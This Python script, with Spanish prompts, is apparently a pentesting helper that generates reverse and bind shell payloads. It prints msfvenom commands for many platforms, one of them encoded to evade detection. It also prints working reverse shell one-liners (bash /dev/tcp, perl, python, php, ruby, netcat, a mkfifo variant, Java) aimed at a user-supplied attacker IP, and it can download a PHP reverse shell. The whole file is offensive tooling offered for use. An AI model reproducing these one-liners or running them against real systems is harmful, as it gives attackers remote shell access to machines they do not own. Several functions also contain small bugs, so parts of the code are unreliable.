#!/usr/bin/python3
#Script para generar reverse y binds shells con msfvenom

from colorama import Fore, Style
import os, time, sys 
from time import sleep
import requests 
import signal 

def signal_handler(key,frame):
    print(Fore.YELLOW + "\n[*]" + Fore.RESET + " Saliendo... \n")
    print(Style.RESET_ALL)
    sys.exit(1)
    
signal=signal.signal(signal.SIGINT,signal_handler)

def banner():
    print(Fore.BLUE +"""  
                                                                                                                                           
 .oooooo..o ooooo   ooooo oooooooooooo ooooo        ooooo         .oooooo..o 
d8P'    `Y8 `888'   `888' `888'     `8 `888'        `888'        d8P'    `Y8 
Y88bo.       888     888   888          888          888         Y88bo.      
 `"Y8888o.   888ooooo888   888oooo8     888          888          `"Y8888o.  
     `"Y88b  888     888   888    "     888          888              `"Y88b 
oo     .d8P  888     888   888       o  888       o  888       o oo     .d8P 
8""88888P'  o888o   o888o o888ooooood8 o888ooooood8 o888ooooood8 8""88888P'  
                                                                             
                                                                                                                        

          """ +Fore.YELLOW + """by"""+Fore.RED + """: Z0diacc | (https://github.com/z0d1acc)

    """+ Fore.RESET)
banner()

def opciones():
    print(Fore.RED + Style.DIM + """
    
\n\t\tELIGE EL TIPO DE REVERSE SHELL:
\n\t"""+Fore.GREEN+"""[1]"""+Fore.RESET+""" Linux Reverse Meterpreter Reverse Shell
\t"""+Fore.BLUE+"""[2]"""+Fore.RESET+""" Windows Meterpreter Reverse TCP Shell
\t"""+Fore.GREEN+"""[3]"""+Fore.RESET+""" Windows Reverse TCP Shell
\t"""+Fore.BLUE+"""[4]"""+Fore.RESET+""" Windows Encoded Meterpreter Windows Reverse Shell
\t"""+Fore.GREEN+"""[5]"""+Fore.RESET+""" Mac Reverse Shel
\t"""+Fore.BLUE+"""[6]"""+Fore.RESET+""" PHP Meterpreter Reverse TCP -Web
\t"""+Fore.GREEN+"""[7]"""+Fore.RESET+""" ASP Meterpreter Reverse TCP -Web
\t"""+Fore.BLUE+"""[8]"""+Fore.RESET+""" JSP Java Meterpreter Reverse TCP -Web
\t"""+Fore.GREEN+"""[9]"""+Fore.RESET+""" WAR Meterpreter Reverse TCP -Web
\t"""+Fore.BLUE+"""[10]"""+Fore.RESET+""" Python Reverse Shell
\t"""+Fore.GREEN+"""[11]"""+Fore.RESET+""" Bash Unix Reverse Shell
\t"""+Fore.BLUE+"""[12]"""+Fore.RESET+""" Perl Unix Reverse shell
\t"""+Fore.GREEN+"""[13]"""+Fore.RESET+""" Netcat Reverse Shell

\n\t\t"""+Fore.RED+"""ELIGE EL TIPO DE BIND SHELL:
\n\t"""+Fore.BLUE+"""[14]"""+Fore.RESET+""" Linux Meterpreter Bind Shell
\t"""+Fore.GREEN+"""[15]"""+Fore.RESET+""" Linux Generic Bind Shell
\t"""+Fore.BLUE+"""[16]"""+Fore.RESET+""" Mac Bind Shell
\t"""+Fore.GREEN+"""[17]"""+Fore.RESET+""" Netcat Bind Shell 

\n\t\t"""+Fore.RED+"""ELIGE EL TIPO DE REVERSE SHELL:
\n\t"""+Fore.BLUE+"""[18]"""+Fore.RESET+""" BASH
\t"""+Fore.GREEN+"""[19]"""+Fore.RESET+""" PERL
\t"""+Fore.BLUE+"""[20]"""+Fore.RESET+""" PYTHON
\t"""+Fore.GREEN+"""[21]"""+Fore.RESET+""" PHP
\t"""+Fore.BLUE+"""[22]"""+Fore.RESET+""" RUBY
\t"""+Fore.GREEN+"""[23]"""+Fore.RESET+""" NETCAT
\t"""+Fore.BLUE+"""[24]"""+Fore.RESET+""" NETCAT v2
\t"""+Fore.GREEN+"""[25]"""+Fore.RESET+""" JAVA
\t"""+Fore.BLUE+"""[26]"""+Fore.RESET+""" DOWNLOAD PHP-REVERSE-SHELL 


    """ + Style.RESET_ALL)    

######################Definir opciones con casos: ##################
 
opciones()


#############REVERSE SHELLS##############


def lmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=%sLPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")
            
def wmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")      


def wrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p windows/shell/reverse_tcp LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")       

def wemrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp -e shikata_ga_nai -i 3 LHOST=%s LPORT=%s -f exe >  %s """%(lhost,lport,sname+".exe")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")  

def mrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p osx/x86/shell_reverse_tcp LHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")     

def phpmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p php/meterpreter_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".php")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print("\n\tUna vez creada:  cat shell.php | pbcopy && echo ‘<?php ‘ | tr -d ‘\n’ > shell.php && pbpaste >> shell.php")
    print(" ")
    
def aspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def aspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p windows/meterpreter/reverse_tcp LHOST=%s LPORT=%s -f asp >  %s """%(lhost,lport,sname+".asp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def jspmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".jsp")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def warmrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p java/jsp_shell_reverse_tcp LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".war")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")    

def pythonrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p cmd/unix/reverse_python LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")  
    
def bashrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_bash LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".sh")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def perlrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_perl LHOST=%s LPORT=%s -f raw >  %s """%(lhost,lport,sname+".pl")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def ncrs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/reverse_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_bash():
   
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" bash -i >& /dev/tcp/%s/%s 0>&1 """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_perl():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" perl -e 'use Socket;$i="%s";$p=%s;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_python():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("%s",%s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'  """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def rev_php():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" php -r '$sock=fsockopen("%s",%s);exec("/bin/sh -i <&3 >&3 2>&3");' """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_ruby():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    simbolo="%d"
    bash_shell=""" ruby -rsocket -e'f=TCPSocket.open("%s",%s).to_i;exec sprintf("/bin/sh -i <&%s >&%s 2>&%s",f,f,f)' """%(lhost,lport,simbolo,simbolo,simbolo)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_netcat():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" nc -e /bin/sh %s %s """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_netcat2():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell=""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s   >/tmp/f """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_java():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce LOCAL IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    bash_shell="""\nr = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/%s/%s;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor() """%(lhost,lport)
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] "+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ") 

def rev_php_grande():
     url=" http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz "
     archivo=requests.get(url)
     open("php-reverse-shell.tar.gz", "wb").write(archivo.content)
     print(Fore.YELLOW + "[+]"+Fore.RESET+ " Download successful! ")




#############BIND SHELLS##############

def lmbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p linux/x86/meterpreter/bind_tcp RHOST=%s LPORT=%s -f elf > %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")
    
def lgbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p generic/shell_bind_tcp RHOST=%s LPORT=%s -f elf >  %s """%(lhost,lport,sname+".elf")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")

def mbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell="""  msfvenom -p osx/x86/shell_bind_tcp RHOST=%s LPORT=%s -f macho >  %s """%(lhost,lport,sname+".macho")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")    

def ncbs():
    lhost=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce REMOTE_IP: ")
    lport=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "Introduce el PORT: ")
    sname=input(Fore.YELLOW + "\n\t [+]"+Fore.RESET+ "SHELL NAME: ")

    bash_shell=""" msfvenom -p cmd/unix/bind_netcat LHOST=%s LPORT=%s -f python >  %s """%(lhost,lport,sname+".py")
    sleep(1)
    print(Fore.RED + "\n\t[CREATED] \n\t"+Fore.RESET+Style.BRIGHT+"%s"%(bash_shell)+Style.RESET_ALL)
    print(" ")        



##########Definicion de casos#####################


while True:
    comando=input(Fore.GREEN + "gen-shells$~" + Fore.RESET)
    if(comando=="1"):
        lmrs()
    elif(comando=="2"):
        wmrs()
    elif(comando=="3"):
        wrs()
    elif(comando=="4"):
        wemrs()
    elif(comando=="5"):
        mrs()
    elif(comando=="6"):
        phpmrs()
    elif(comando=="7"):
        aspmrs()
    elif(comando=="8"):
        jspmrs()
    elif(comando=="9"):
        warmrs()
    elif(comando=="10"):
        pythonrs()  
    elif(comando=="11"):
        bashrs()
    elif(comando=="12"):
        perlrs()
    elif(comando=="13"):
        ncrs()
    elif(comando=="14"):
        lmbs()
    elif(comando=="15"):
        lgbs()    
    elif(comando=="16"):
         mbs()   
    elif(comando=="17"):
         ncbs()
    elif(comando=="18"):
        rev_bash()
    elif(comando=="19"):
        rev_perl()
    elif(comando=="20"):
        rev_python()
    elif(comando=="21"):
        rev_php()
    elif(comando=="22"):
        rev_ruby()
    elif(comando=="23"):
        rev_netcat()
    elif(comando=="24"):
        rev_netcat2()
    elif(comando=="25"):
        rev_java()
    elif(comando=="26"):
        rev_php_grande()
    elif(comando=="exit"):
         sys.exit()                   
    else:
        print(Fore.RED + "[-]"+Fore.RESET+ " Command not found!") 

        
